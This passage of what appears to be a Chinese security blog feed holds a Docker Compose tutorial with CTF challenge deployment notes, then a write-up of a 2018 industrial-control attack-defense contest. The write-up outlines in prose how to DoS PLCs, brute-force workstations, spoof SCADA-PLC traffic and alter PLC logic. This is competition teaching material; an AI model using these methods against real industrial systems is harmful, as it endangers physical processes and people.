class="string">"googledns:8.8.8.8"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"dockerhub:52.1.157.61"</span></span><br></pre></td></tr></table></figure><p>会在启动后的服务容器中 <code>/etc/hosts</code> 文件中添加如下两条条目。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8 googledns</span><br><span class="line">52.1.157.61 dockerhub</span><br></pre></td></tr></table></figure><p><code>healthcheck</code></p><p>通过命令检查容器是否健康运行。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">healthcheck:</span></span><br><span class="line"><span class="attr">  test:</span> <span class="string">["CMD",</span> <span class="string">"curl"</span><span class="string">,</span> <span class="string">"-f"</span><span class="string">,</span> <span class="string">"http://localhost"</span><span class="string">]</span></span><br><span class="line"><span class="attr">  interval:</span> <span class="number">1</span><span class="string">m30s</span></span><br><span class="line"><span class="attr">  timeout:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">  retries:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><code>image</code></p><p>指定为镜像名称或镜像 ID。如果镜像在本地不存在，<code>Compose</code> 将会尝试拉取这个镜像。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">ubuntu</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">orchardup/postgresql</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">a4bc65fd</span></span><br></pre></td></tr></table></figure><p><code>labels</code></p><p>为容器添加 Docker 元数据（metadata）信息。例如可以为容器添加辅助说明信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="string">com.startupteam.description:</span> <span class="string">"webapp for a startup team"</span></span><br><span class="line">  <span class="string">com.startupteam.department:</span> <span class="string">"devops department"</span></span><br><span class="line">  <span class="string">com.startupteam.release:</span> <span class="string">"rc3 for v1.0"</span></span><br></pre></td></tr></table></figure><p><code>links</code></p><blockquote><p>注意：不推荐使用该指令。</p></blockquote><p><code>logging</code></p><p>配置日志选项。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line"><span class="attr">  driver:</span> <span class="string">syslog</span></span><br><span class="line"><span class="attr">  options:</span></span><br><span class="line"><span class="attr">    syslog-address:</span> <span class="string">"tcp://192.168.0.42:123"</span></span><br></pre></td></tr></table></figure><p>目前支持三种日志驱动类型。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver:</span> <span class="string">"json-file"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"syslog"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"none"</span></span><br></pre></td></tr></table></figure><p><code>options</code> 配置日志驱动的相关参数。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">options:</span></span><br><span class="line"><span class="attr">  max-size:</span> <span class="string">"200k"</span></span><br><span class="line"><span class="attr">  max-file:</span> <span class="string">"10"</span></span><br></pre></td></tr></table></figure><p><code>network_mode</code></p><p>设置网络模式。使用和 <code>docker run</code> 的 <code>--network</code> 参数一样的值。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network_mode:</span> <span class="string">"bridge"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"host"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"none"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"service:[service name]"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"container:[container name/id]"</span></span><br></pre></td></tr></table></figure><p><code>networks</code></p><p>配置容器连接的网络。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  some-service:</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">     -</span> <span class="string">some-network</span></span><br><span class="line"><span class="bullet">     -</span> <span class="string">other-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">  some-network:</span></span><br><span class="line"><span class="attr">  other-network:</span></span><br></pre></td></tr></table></figure><p><code>pid</code></p><p>跟主机系统共享进程命名空间。打开该选项的容器之间，以及容器和宿主机系统之间可以通过进程 ID 来相互访问和操作。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pid:</span> <span class="string">"host"</span></span><br></pre></td></tr></table></figure><p><code>ports</code></p><p>暴露端口信息。</p><p>使用宿主端口：容器端口 <code>(HOST:CONTAINER)</code> 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"3000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"8000:8000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"49100:22"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"127.0.0.1:8001:8001"</span></span><br></pre></td></tr></table></figure><p><em>注意：当使用 <code>HOST:CONTAINER</code> 格式来映射端口时，如果你使用的容器端口小于 60 并且没放到引号里，可能会得到错误结果，因为 <code>YAML</code> 会自动解析 <code>xx:yy</code> 这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。</em></p><p><code>secrets</code></p><p>存储敏感数据，例如 <code>mysql</code> 服务密码。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.1"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mysql:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">  environment:</span></span><br><span class="line"><span class="attr">    MYSQL_ROOT_PASSWORD_FILE:</span> <span class="string">/run/secrets/db_root_password</span></span><br><span class="line"><span class="attr">  secrets:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">db_root_password</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">my_other_secret</span></span><br><span class="line"></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line"><span class="attr">  my_secret:</span></span><br><span class="line"><span class="attr">    file:</span> <span class="string">./my_secret.txt</span></span><br><span class="line"><span class="attr">  my_other_secret:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><code>security_opt</code></p><p>指定容器模板标签（label）机制的默认属性（用户、角色、类型、级别等）。例如配置标签的用户名和角色名。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">security_opt:</span></span><br><span class="line"><span class="attr">    - label:</span><span class="attr">user:USER</span></span><br><span class="line"><span class="attr">    - label:</span><span class="attr">role:ROLE</span></span><br></pre></td></tr></table></figure><p><code>stop_signal</code></p><p>设置另一个信号来停止容器。在默认情况下使用的是 SIGTERM 停止容器。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stop_signal:</span> <span class="string">SIGUSR1</span></span><br></pre></td></tr></table></figure><p><code>sysctls</code></p><p>配置容器内核参数。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="string">net.core.somaxconn:</span> <span class="number">1024</span></span><br><span class="line">  <span class="string">net.ipv4.tcp_syncookies:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sysctls:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">net.core.somaxconn=1024</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">net.ipv4.tcp_syncookies=0</span></span><br></pre></td></tr></table></figure><p><code>ulimits</code></p><p>指定容器的 ulimits 限制值。</p><p>例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line"><span class="attr">  nproc:</span> <span class="number">65535</span></span><br><span class="line"><span class="attr">  nofile:</span></span><br><span class="line"><span class="attr">    soft:</span> <span class="number">20000</span></span><br><span class="line"><span class="attr">    hard:</span> <span class="number">40000</span></span><br></pre></td></tr></table></figure><p><code>volumes</code></p><p>数据卷所挂载路径设置。可以设置宿主机路径 （<code>HOST:CONTAINER</code>） 或加上访问模式 （<code>HOST:CONTAINER:ro</code>）。</p><p>该指令中路径支持相对路径。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">/var/lib/mysql</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">cache/:/tmp/cache</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">~/configs:/etc/configs/:ro</span></span><br></pre></td></tr></table></figure><p><strong>其它指令</strong></p><p>此外，还有包括 <code>domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir</code> 等指令，基本跟 <code>docker run</code> 中对应参数的功能一致。</p><p>指定服务容器启动后执行的入口文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entrypoint:</span> <span class="string">/code/entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>指定容器中运行应用的用户名。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">user:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure><p>指定容器中工作目录。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">working_dir:</span> <span class="string">/code</span></span><br></pre></td></tr></table></figure><p>指定容器中搜索域名、主机名、mac 地址等。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">domainname:</span> <span class="string">your_website.com</span></span><br><span class="line"><span class="attr">hostname:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">mac_address:</span> <span class="number">08</span><span class="bullet">-00</span><span class="bullet">-27</span><span class="bullet">-00</span><span class="bullet">-0</span><span class="string">C-0A</span></span><br></pre></td></tr></table></figure><p>允许容器中运行一些特权命令。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>指定容器退出后的重启策略为始终重启。该命令对保持服务始终运行十分有效，在生产环境中推荐配置为 <code>always</code> 或者 <code>unless-stopped</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><p>以只读模式挂载容器的 root 文件系统，意味着不能对容器内容进行修改。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">read_only:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>打开标准输入，可以接受外部输入。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stdin_open:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>模拟一个伪终端。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>读取变量</strong></p><p>Compose 模板文件支持动态读取主机的系统环境变量和当前目录下的 <code>.env</code> 文件中的变量。</p><p>例如，下面的 Compose 文件将从运行它的环境中读取变量 <code>${MONGO_VERSION}</code> 的值，并写入执行的指令中。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">db:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="string">"mongo:$&#123;MONGO_VERSION&#125;"</span></span><br></pre></td></tr></table></figure><p>如果执行 <code>MONGO_VERSION=3.2 docker-compose up</code> 则会启动一个 <code>mongo:3.2</code> 镜像的容器；如果执行 <code>MONGO_VERSION=2.8 docker-compose up</code> 则会启动一个 <code>mongo:2.8</code> 镜像的容器。</p><p>若当前目录存在 <code>.env</code> 文件，执行 <code>docker-compose</code> 命令时将从该文件中读取变量。</p><p>在当前目录新建 <code>.env</code> 文件并写入以下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 支持 # 号注释</span></span><br><span class="line">MONGO_VERSION=3.6</span><br></pre></td></tr></table></figure><p>执行 <code>docker-compose up</code> 则会启动一个 <code>mongo:3.6</code> 镜像的容器。</p><h1 id="Docker-for-CTF-Apply"><a href="#Docker-for-CTF-Apply" class="headerlink" title="Docker for CTF Apply"></a>Docker for CTF Apply</h1><hr><h3 id="CTF-web"><a href="#CTF-web" class="headerlink" title="CTF-web"></a>CTF-web</h3><p>1、查找可用镜像：docker search lamp(这是linux+apache+mysql+php的集成环境，部署web题可用)</p><p>2、拉取镜像：docker pull tutum/lamp （具体镜像看需求，这里是Out-of-the-box LAMP image (PHP+MySQL) ）</p><p>3、运行镜像并绑定端口：docker run -d -p 1000:80 tutum/lamp 1000指的是需要公网访问的端口，后面跟镜像名称，如果是要不同端口搭建不同web题目可重复使用此命令，改端口就行。</p><p>4、最好先把题目下载到服务器本地，然后把题目拷贝到docker容器：docker cp 题目名称 容器ID:/var/www/html 一般web路径是/var/www/html，容器里面很多命令都没有，如wget，unzip等都没有，建议在本地就弄好</p><p>如果需要数据库</p><p>1、进入要用到数据库的容器内部：docker exec -it 容器ID /bin/bash<br>2、进入之后连接数据库：mysql -u root (默认没有密码)<br>3、可以先看看有什么数据库：SHOW DATABASE;<br>4、创建数据库：create DATABASE 数据库名;<br>5、使用数据库：use 数据库名；<br>6、给数据库创建用户：create user 用户名@localhost identified by ‘密码’；<br>7、授权用户：grant all privileges on 数据库名.* to 用户名@localhost;<br>8、刷新：flush privileges;<br>9、如写好了.sql的数据库，可导入数据：source 文件的路径 （这个路径是容器路径，一开始要把服务器本地的文件拷贝到容器里）</p><p><strong>运维命令</strong></p><p>1、查看有什么容器和运行情况：docker ps -a<br>2、进入容器：docker exec -it 容器ID /bin/bash<br>3、启动容器：docker start 容器ID1 容器ID2 （这个可以启动多个容器）停止容器就把start改为stop即可<br>4、如果服务器重启了之后docker没启动，可以添加参数保证每次重启之后容器也重启：docker update –restart=always 多个容器ID</p><blockquote><p>出题最好写dockerfile 方便比赛选手复现XD</p></blockquote><h3 id="CTF-Pwn"><a href="#CTF-Pwn" class="headerlink" title="CTF-Pwn"></a>CTF-Pwn</h3><p>现在一般 CTF Pwn的环境都是由 xinted + docker 组成。在github上 <a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinetd</a> 的项目从权限到服务配置都做好了一个dockerfile 我们只需要build一下就好了..具体步骤如下</p><ul><li>安装 docker<br>在 ubuntu环境下，需要以root 安装 docker<br>sudo apt-get install docker-ce<br>clone ctf_xinetd项目<br>git clone <a href="https://github.com/Eadom/ctf_xinetd.git" target="_blank" rel="noopener">https://github.com/Eadom/ctf_xinetd.git</a></li><li>配置 docker环境<br>1、 将你的bin 文件放置到 bin 目录下<br>2、 修改 flag 文本内容 为你指定的 flag<br>3、紧接着修改 ctf.xinetd 的服务：<br>port为指定端口</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_args = <span class="params">--userspec=1000</span><span class="function">:1000</span> <span class="string">/home/ctf</span> <span class="string">./helloworld</span></span><br></pre></td></tr></table></figure><p>修改”helloworld”为你的bin文件名称</p><ul><li>build dockerfile<br>在git下的目录下<br><code>docker build -t &quot;helloworld&quot; .</code> (注意后面是有个点的），helloword是你编译后image的名称，不要使用bin作为挑战的名称</li><li>创建容器<br>docker 的容器相当于是运行了一个虚拟机，创建容器后，就是将镜像跑起来了。</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p <span class="string">"0.0.0.0:pub_port:9999"</span> -h <span class="string">"helloworld"</span> --name=<span class="string">"helloworld"</span> helloworld</span></span><br><span class="line">//-h 主机名 ； --name 容器名</span><br></pre></td></tr></table></figure><p>pub_port 是您要向公共网络公开的端口</p><p>如果您想捕获挑战流量，只需tcpdump在主机上运行即可。这是一个例子。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -w helloworld<span class="selector-class">.pcap</span> -<span class="selector-tag">i</span> eth0 port pub_port</span><br></pre></td></tr></table></figure><p><strong>另外</strong><br>正常情况下 docker是需要sudo权限才能跑的。所以如果在非root下创建环境，记得用sudo 运行docker</p><p><strong>最后</strong></p><p>复现题目都很简单,便捷式的部署框架也很多，下面会贴几个我的fock.</p><p>出题和部署才需要多实践才能熟练掌握docker在CTF的妙用(23333)</p><ul><li><p><a href="https://github.com/Qymua/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/Qymua/pwn_deploy_chroot</a></p></li><li><p><a href="https://github.com/Qymua/ctf_xinetd" target="_blank" rel="noopener">https://github.com/Qymua/ctf_xinetd</a></p></li><li><p><a href="https://github.com/Qymua/pwn-env-init" target="_blank" rel="noopener">https://github.com/Qymua/pwn-env-init</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;进入这个圈子挺久了，还没碰过docker，趁着暑假闲得慌，打一波基础XD &lt;/p&gt;
&lt;p&gt;😄docker是个好东西，在CTF比赛中我们可以
      
    
    </summary>
    
      <category term="Docker" scheme="http://qymua.com/categories/Docker/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="docker-compose" scheme="http://qymua.com/tags/docker-compose/"/>
    
      <category term="Pwn" scheme="http://qymua.com/tags/Pwn/"/>
    
      <category term="web" scheme="http://qymua.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018FJ工控攻防大赛WriteUp</title>
    <link href="http://qymua.com/2019/08/15/2018FJ%E5%B7%A5%E6%8E%A7%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9BWriteUp/"/>
    <id>http://qymua.com/2019/08/15/2018FJ工控攻防大赛WriteUp/</id>
    <published>2019-08-15T13:54:24.000Z</published>
    <updated>2019-08-16T13:15:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是一次省内首次举办的工控攻防大赛，赛制有别于国内往届工业信息安全技能竞赛，本质其实就是内网渗透，攻击目标靶机取得控制权并篡改其程序</p></blockquote><a id="more"></a><h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1565875668841.png" alt></p><p><strong>第一层:通过攻击，导致工作站与靶机系统通信中断</strong></p><p>攻击思路:</p><p>通信中断，大屏显示器组态界面右上角会红字闪烁提示通信异常。整条通信链路上有工作站、交换机、PLC，可以优先尝试使用拒绝服务攻击手段。</p><p>PLC属于工业产品，一般工业产品针对网络安全方面的属性偏弱，可能存在某些可利用.漏洞，整机性能一般也有限，易受dos攻击且抵抗力较差。</p><p>攻击工作站，一般先获取工作站相关信息，比如操作系统类型等，根据已知的信息，来规划下一步的攻击思路，如果操作系统开启了系统自带防火墙功能，会在一定程度上抵御,dos攻击。</p><p>交换机网络数据交换性能强，小规模的dos 攻击，对其难有成效，可尝试寻找未修复的漏洞并加以利用，相比PLC和工作站而言，直接攻击难度稍微偏大。</p><p>所以，攻击排序建议为: PLC&gt;I作站&gt;交换机。</p><p><strong>第二层:通过攻击，实现对工作站关键位置的文件窃取</strong></p><p>攻击思路:</p><p>窃取陌生主机上文件，通常有两种方法,一是查看该主机是否有直接开放对外的共享文件夹或FTP，二是直接接管工作站，以管理员权限登录系统获得文件。由于比赛时间有限,而且规则允许越层攻击，所以要综合评估。</p><p>鉴于第三层的规则，可以判断，该层应该已经开放共享文件夹或FTP权限。</p><p>通过攻击工具对工作站进行扫描，如利用端口扫描工具检测是否开放21、445等高危端口，若遇到弱口令，可以尝试使用预先备好的密码字典文件，进行暴力破解。字典文件过大，则可能导致破译的时间变长。</p><p><strong>第三层，通过攻击，获取工作站管理员权限</strong></p><p>攻击思路:</p><p>获取管理员权限的思路有多种，比如弱口令猜测，系统漏洞利用等。</p><p>如果有可直接利用的高危端口，比如开放了Telnet、 3389 等远程登录服务，即可尝试弱口令猜测。</p><p>如果口令长时间破解不出来，可以扫描系统漏洞，利用漏洞进行提权。</p><p><strong>第四层:通过攻击，篡改靶机系统参数</strong></p><p>攻击思路</p><p>前三层与传统安全无异，而第四层则需要工业自动化领域方面知识。如果熟悉自动化领域，则第四层、第五层的攻击就会变得很轻松。</p><p>工业环境的工作站，主要有工程师站、操作员站等。工程师站主要负责组态的编写和修改,操作员站主要负责设备的监控和操作。比赛现场只有一台工作站，则说明该站一机多用。</p><p>规则中要求黄灯亮，绿灯灭，所以攻击时必须先看懂组态界面。如果组态界面上有可以直接操作指示灯亮灭的按钮，则可以快速实现该操作，通过本层次。</p><p>如果组态界面上的操作按钮不起作用或者没有操作按钮，则可以利用组态或PLC 编程等相关软件，直接编写程序，篡改代码及参数，下发并执行。刚方法也将用于第五层相同。</p><p><strong>第五层:通过攻击，篡改靶机系统控制程序</strong></p><p>攻击思路:</p><p>熟悉梯形图，懂得编写PLC程序，直接使月组态或PLC编程等相关软件，即可轻松通过本层次。</p><h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1565876578132.png" alt></p><p><strong>第一层:获取SCADA主机系统管理权限</strong></p><p>攻击思路:</p><p>与初赛第三层相同。由于是决赛环节，主机系统安全配置会进行加固，相比初赛，难度有所提升。</p><p><strong>第二层:获取SCADA主机桌面，上的密函文件的内容</strong></p><p>攻击思路:</p><p>获取SCADA主机权限后，可以搜索寻找硬盘上的任意文件。</p><p>根据提示可以进去桌面文件夹，找到密函文件。根据题意，需要获取文件里面的内容。如果双击文件打开的内容为乱码或与提示不符，则说明该文件采取了某些技术混淆视听。</p><p>可能是压缩包文件，需要破解密码，也可能是图片文件，内容隐写其中。所以可以对该文件重新定义类型并找出密函。</p><p><strong>第三层:造成SCADA系统与靶机系统拒绝服务</strong></p><p>攻击思路:</p><p>与初赛第一层攻击思路相同，但靶机系统前多了安全网关，可能会对dos攻击进行拦截。</p><p>可以尝试对上位机进行突破，伪装上位机，进而导致真是机器通信中断。</p><p><strong>第四层:修改SCADA系统监控状态</strong></p><p>攻击思路:</p><p>前三层与传统安全无异，而第四层则需要工业自动化领域方面知识</p><p>工业环境的工作站，主要有工程师站、操作员站等。工程师站主要负责组态的编写和修改,操作员站主要负责设备的监控和操作。比赛现场只有一台工作站，则说明该站一机多用。</p><p>该层规则要求完成SCADA系统组态界面数值发生改变，靶机系统数字显示表上数值不变，一般可以采取两种方式，一是中间人欺骗攻击，截取SCADA与PLC的报文，阻断并接管通讯，将篡改后的报文发送给SCADA;二是利用组态或PLC编程等相关软件.直接编写程序，篡改代码及参数，下发并执行。该方法也将用于第五层相同。</p><p><strong>第五层修改靶机系统逻辑</strong></p><p>攻击思路:</p><p>与初赛第五层攻击思路基本相同，熟悉梯形图，懂得编写PLC程序，直接使用组态或;PLC编程等相关软件，就有可能通过本层次。但又与初赛第五层不同的是，决赛环节多了安全网关设备，该设备会防住异常读写的操作，所以如果久攻不下，就要考虑先获取安全网关设备的控制权或绕过安全网关，完成PLC程序的写入操作。</p><p> <strong>第六层攻坚保卫战，保护自身队伍红旗飘飘</strong></p><p>攻击思路:</p><p>进入第六层需要两个必备条件,一是攻破第二层拿到密函文件;二是攻破第五层拿到军事要塞资格。</p><p>第二层的密函文件破译环节，可以将文件拷贝给团队中其他的攻击人员，让团队闲置的电脑设备，去完成破译密函内容的工作。该环节还有一个隐藏的技术问题，即使获取了密函文件里面的内容，还需要看懂该内容所表达的意思，否则第六层的攻防将无从入手。</p><p>该层次的攻击，从攻击技术角度分析，比较简单，只要通过Modbus相关工具连接并篡改参数即可实现亮起红旗，但要保持队伍的旗帜常亮，则很考验智慧。根据比赛规则，该层次所使用的主机和交换机，不能作为攻击对象，所以有能力的队伍，可以对其他队伍的比赛设备发起攻击，互相攻防。</p><p>附件：<a href="https://raw.githubusercontent.com/Qymua/CTF-Writeups/master/2019/福建工控攻防大赛/Competition WriteUp by 2 hours.png" target="_blank" rel="noopener">Competition WriteUp by 2 hours</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这是一次省内首次举办的工控攻防大赛，赛制有别于国内往届工业信息安全技能竞赛，本质其实就是内网渗透，攻击目标靶机取得控制权并篡改其程序&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Writeup" scheme="http://qymua.com/categories/Writeup/"/>
    
    
      <category term="工控" scheme="http://qymua.com/tags/%E5%B7%A5%E6%8E%A7/"/>
    
      <category term="getshell" scheme="http://qymua.com/tags/getshell/"/>
    
      <category term="PLC" scheme="http://qymua.com/tags/PLC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.04 for Pwn</title>
    <link href="http://qymua.com/2019/05/23/Ubuntu-16-04-for-Pwn/"/>
    <id>http://qymua.com/2019/05/23/Ubuntu-16-04-for-Pwn/</id>
    <published>2019-05-22T17:02:36.000Z</published>
    <updated>2019-08-10T07:11:58.000Z</updated>
    
